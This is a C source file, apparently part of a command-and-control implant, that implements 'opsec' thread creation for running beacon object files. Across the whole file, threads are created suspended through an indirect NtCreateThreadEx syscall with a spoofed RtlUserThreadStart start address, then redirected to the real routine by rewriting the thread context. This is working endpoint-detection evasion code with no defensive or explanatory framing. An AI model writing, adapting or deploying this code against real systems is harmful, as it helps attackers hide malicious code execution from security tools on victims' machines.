#include "OpsecThread.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "IndirectSyscall.h"
#include "ProcLoader.h"

#ifndef THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001UL
#endif

#define AX_NT_THREAD_ALL_ACCESS ((ACCESS_MASK)0x001FFFFF)

void Opsec_PreBlockingWinHttp(void)
{
	if (ApiWin && ApiWin->SwitchToThread)
		ApiWin->SwitchToThread();
}

static HANDLE AbortCreatedThread(HANDLE h)
{
	if (!h)
		return NULL;
	if (ApiNt && ApiNt->NtTerminateThread)
		ApiNt->NtTerminateThread(h, 0);
	if (ApiNt && ApiNt->NtClose)
		ApiNt->NtClose(h);
	return NULL;
}

#if defined(_M_X64) || defined(__x86_64__)
static HANDLE ResumeSpoofedStart_x64(HANDLE h, LPTHREAD_START_ROUTINE fn, LPVOID param, LPDWORD lpThreadId)
{
	CONTEXT ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;
	if (!ApiWin->GetThreadContext(h, &ctx))
		return AbortCreatedThread(h);

	ctx.Rcx = (DWORD64)(ULONG_PTR)param;
	ctx.Rip = (DWORD64)(ULONG_PTR)fn;

	if (!ApiWin->SetThreadContext(h, &ctx))
		return AbortCreatedThread(h);

	if (lpThreadId) {
		if (ApiWin->GetThreadId)
			*lpThreadId = ApiWin->GetThreadId(h);
		else
			*lpThreadId = 0;
	}

	if (ApiWin->ResumeThread(h) == (DWORD)-1)
		return AbortCreatedThread(h);
	return h;
}

static HANDLE TryNtCreateThreadExSpoofed_x64(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, LPDWORD lpThreadId, PVOID rtlStart)
{
	HANDLE hThread = NULL;
	INDIRECT_NT_CREATETHREADEX_ARGS a;
	memset(&a, 0, sizeof(a));
	a.ThreadHandle = &hThread;
	a.DesiredAccess = AX_NT_THREAD_ALL_ACCESS;
	a.ObjectAttributes = NULL;
	a.ProcessHandle = (ULONG_PTR)NtCurrentProcess();
	a.StartRoutine = rtlStart;
	a.Argument = NULL;
	a.CreateFlags = THREAD_CREATE_FLAGS_CREATE_SUSPENDED;
	a.ZeroBits = 0;
	a.SizeOfStackCommit = 0;
	a.SizeOfStackReserve = 0;
	a.AttributeList = NULL;

	NTSTATUS st = Indirect_NtCreateThreadEx(&a);
	if (!NT_SUCCESS(st) || !hThread)
		return NULL;

	return ResumeSpoofedStart_x64(hThread, lpStartAddress, lpParameter, lpThreadId);
}
#endif

HANDLE Opsec_CreateAsyncBofThread(LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, LPDWORD lpThreadId)
{
	if (!ApiWin || !ApiWin->CreateThread)
		return NULL;

#if defined(_M_X64) || defined(__x86_64__)
	if (SysModules && SysModules->Ntdll && ApiWin->GetThreadContext && ApiWin->SetThreadContext && ApiWin->ResumeThread) {
		PVOID rtlStart = GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_RTLUSERTHREADSTART);
		if (rtlStart) {
			HANDLE hNt = TryNtCreateThreadExSpoofed_x64(lpStartAddress, lpParameter, lpThreadId, rtlStart);
			if (hNt)
				return hNt;

			HANDLE h = ApiWin->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)rtlStart, NULL, CREATE_SUSPENDED, lpThreadId);
			if (h) {
				HANDLE hDone = ResumeSpoofedStart_x64(h, lpStartAddress, lpParameter, lpThreadId);
				if (hDone)
					return hDone;
			}
		}
	}
#endif

	return ApiWin->CreateThread(NULL, 0, lpStartAddress, lpParameter, 0, lpThreadId);
}
